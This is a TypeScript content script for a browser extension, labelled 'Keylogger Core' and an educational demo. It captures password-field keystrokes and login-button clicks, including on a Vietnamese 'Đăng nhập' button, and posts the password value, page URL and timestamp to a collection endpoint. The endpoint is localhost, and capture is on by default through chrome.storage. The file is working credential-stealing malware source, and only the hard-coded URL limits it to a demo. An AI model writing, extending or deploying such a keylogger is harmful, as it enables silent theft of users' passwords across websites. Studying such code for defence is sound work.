/**
 * Content Script — Keylogger Core (Task 2.1)
 * Educational security demo only. Operates on localhost/127.0.0.1 exclusively.
 */

export interface CaptureEvent {
  timestamp: string; // ISO 8601
  url: string;
  type: "keypress" | "submit";
  value: string;
}

/**
 * Sends a CaptureEvent to the local server via HTTP POST.
 * Retries up to 2 times on failure (3 total attempts).
 * Falls back to console.log if all attempts fail.
 * Requirements: 4.1, 4.2, 4.5
 */
export async function sendCapture(event: CaptureEvent): Promise<void> {
  const MAX_ATTEMPTS = 3;
  for (let attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
    try {
      const response = await fetch("http://localhost:3000/capture", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          timestamp: event.timestamp,
          url: event.url,
          type: event.type,
          value: event.value,
        }),
      });
      if (response.ok) return;
      // Non-2xx response counts as failure — retry
    } catch {
      // Network error — retry
    }
  }
  // All attempts exhausted: fallback
  console.log("[SecurityDemo] capture:", event);
}

// Internal capture dispatcher — indirected so tests can override via setSendCapture
let _sendCapture: (event: CaptureEvent) => Promise<void> = sendCapture;

/** Override the capture dispatcher (used in tests). */
export function setSendCapture(
  fn: (event: CaptureEvent) => Promise<void>
): void {
  _sendCapture = fn;
}

/** Reset the capture dispatcher to the default. */
export function resetSendCapture(): void {
  _sendCapture = sendCapture;
}

// Bound listener references so we can detach them later
let keyupHandler: ((e: Event) => void) | null = null;
let clickHandler: ((e: Event) => void) | null = null;

export function attachListeners(): void {
  const passwordField = document.querySelector<HTMLInputElement>(
    'input[type="password"]'
  );

  // Requirement 2.4: do nothing if no password field exists
  if (!passwordField) return;

  keyupHandler = (_e: Event) => {
    const field = document.querySelector<HTMLInputElement>(
      'input[type="password"]'
    );
    if (!field) return;
    const captureEvent: CaptureEvent = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      type: "keypress",
      value: field.value,
    };
    _sendCapture(captureEvent);
  };

  clickHandler = (e: Event) => {
    const target = e.target as HTMLElement;
    // Walk up to find the actual button element
    const button = target.closest<HTMLElement>(
      'button, input[type="submit"], input[type="button"]'
    );
    const textSource = button ?? target;
    const text =
      textSource instanceof HTMLInputElement
        ? textSource.value
        : textSource.textContent ?? "";

    if (!/Đăng nhập|Login|Submit/i.test(text.trim())) return;

    const field = document.querySelector<HTMLInputElement>(
      'input[type="password"]'
    );
    const captureEvent: CaptureEvent = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      type: "submit",
      value: field?.value ?? "",
    };
    _sendCapture(captureEvent);
  };

  passwordField.addEventListener("keyup", keyupHandler);
  // Listen on document for click so we catch button clicks regardless of DOM depth
  document.addEventListener("click", clickHandler);
}

export function detachListeners(): void {
  const passwordField = document.querySelector<HTMLInputElement>(
    'input[type="password"]'
  );
  if (keyupHandler) {
    passwordField?.removeEventListener("keyup", keyupHandler);
    keyupHandler = null;
  }
  if (clickHandler) {
    document.removeEventListener("click", clickHandler);
    clickHandler = null;
  }
}

export function onStorageChange(
  changes: { [key: string]: chrome.storage.StorageChange }
): void {
  if ("active" in changes) {
    if (changes["active"].newValue === true) {
      attachListeners();
    } else {
      detachListeners();
    }
  }
}

// Bootstrap: read initial state from chrome.storage.local
// Task 2.2 will wire this up fully; for now default to active if storage unavailable
if (typeof chrome !== "undefined" && chrome.storage) {
  chrome.storage.local.get("active", (result) => {
    const active = result["active"] !== false; // default true
    if (active) attachListeners();
  });
  chrome.storage.onChanged.addListener(onStorageChange);
} else {
  // Fallback for environments without chrome.storage (e.g. tests)
  attachListeners();
}
